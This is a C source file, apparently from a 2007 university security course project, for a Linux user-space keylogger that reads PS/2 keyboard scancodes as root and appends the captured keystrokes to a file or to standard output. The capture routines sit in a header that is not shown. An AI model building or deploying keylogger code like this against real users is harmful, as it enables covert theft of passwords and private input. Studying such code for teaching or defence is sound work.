/* CMSC 426 Project
 * File: klogger.c
 * Author: Patrick Carroll <pcarrol1@umbc.edu>
 * Date: December 2007
 *
 * This file is a user-space keylogger written for Linux.  It works by reading
 * directly from the PS/2 port and interpreting the scancodes it sees into
 * characters.  
 *
 * IMPROVEMENTS:
 * 	o Could interpret the PS/2 mouse scancodes and ignore them so this
 * 	will work with a computer running X
 *
 * 	o Allow this to take any keyboard mapping
 * 
 *
 * For lots of information about linux and keyboards:
 *
 * http://gunnarwrobel.de/wiki/Linux-and-the-keyboard.html
 * http://www.faqs.org/docs/Linux-mini/IO-Port-Programming.html
 * Also, take a look at the file: 
 * 	/usr/src/linux-source-xxx/drivers/char/keyboard.c
 */
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <sys/types.h>
#include "keyboard_port.h"


#define ROOT_UID	 	0

static int do_output_close = 0;
static FILE *output;


void check_args(int argc, char **argv)
{
	if (argc > 2) {
		fprintf(stderr, "Usage: %s\n", argv[0]);
		exit(1);
	} else if (argc == 2) {
		output = fopen(argv[1], "a");
		if (!output) {
			fprintf(stderr, "Couldn't open file: %s\n", argv[1]);
			exit(1);
		}
		do_output_close = 1;
	} else {
		output = stdout;
	}
}


void check_user() 
{
	if (getuid() != ROOT_UID) {
		fprintf(stderr, "You must be root to run this program\n");
		exit(2);
	}
}


void catch_int(int sig_num)
{
	if (do_output_close)
		fclose(output);
	/* return success */
	exit(0);
}


void output_character(unsigned char c)
{
	fputc(c, output);
	fflush(output);
}


int main(int argc, char **argv)
{
	/* since this will run indefinitely, stop with 
	 * the Ctrl-C signal */
	signal(SIGINT, catch_int);

	/* make sure we're good to go */
	check_args(argc, argv);
	check_user();

	set_up_permissions();

	/* enter the main loop */
	get_character_from_port(output);

	return 0;
}
